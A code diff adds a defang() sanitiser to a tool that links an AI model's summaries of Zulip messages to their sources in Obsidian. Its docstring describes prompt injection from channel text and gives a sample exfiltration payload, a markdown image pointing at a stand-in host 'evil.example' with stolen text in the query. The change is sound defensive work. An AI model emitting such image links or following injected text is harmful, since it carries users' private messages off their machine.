@@ -4,6 +4,11 @@ The model never writes URLs. It cites message ids, and this code builds the
 links from the messages it was actually shown. A cited id that wasn't in the
 input is dropped, and a bullet left with no real source gets flagged, so a
 made-up item can't pass as a sourced one.
+
+Anything link-shaped the model writes anyway is removed by defang. Zulip text
+is written by anyone in a watched channel, and Obsidian fetches a remote image
+as soon as a page renders, so an injected "![](https://evil.example/?q=...)"
+would carry other messages off the machine.
 """
 
 from __future__ import annotations
@@ -16,6 +21,22 @@ from crier.zulip import Message
 CITATION = re.compile(r"\[\s*(m\d+(?:\s*[,;]\s*m?\d+)*)\s*\]")
 BULLET = re.compile(r"^\s*(?:[-*+]|\d+[.)])\s")
 NO_SOURCE = " _(no source)_"
+
+IMAGE = re.compile(r"!\[[^\]\n]*\]\([^)\n]*\)")
+LINK = re.compile(r"\[([^\]\n]*)\]\([^)\n]*\)")
+REF_DEF = re.compile(r"^ {0,3}\[[^\]\n]+\]:[ \t]*(?:<|//|[A-Za-z][A-Za-z0-9+.-]*://).*$", re.MULTILINE)
+TAG = re.compile(r"</?[A-Za-z][^>\n]*>")  # HTML and <https://...> autolinks
+URL = re.compile(r"\b[A-Za-z][A-Za-z0-9+.-]*://\S+")
+LINK_GONE = "(link)"
+
+
+def defang(text: str) -> str:
+    """Model output with every image, link, HTML tag and URL taken out."""
+    text = REF_DEF.sub("", text)
+    text = IMAGE.sub("", text)
+    text = LINK.sub(r"\1", text)
+    text = TAG.sub("", text)
+    return URL.sub(LINK_GONE, text)
 
 
 def encode_hash(s: str) -> str:
@@ -40,7 +61,7 @@ def cited_ids(line: str) -> list[int]:
 
 def link_citations(text: str, by_id: dict[int, Message], site: str) -> str:
     lines = []
-    for line in text.splitlines():
+    for line in defang(text).splitlines():
         sourced = False
 
         def replace(match: re.Match) -> str:
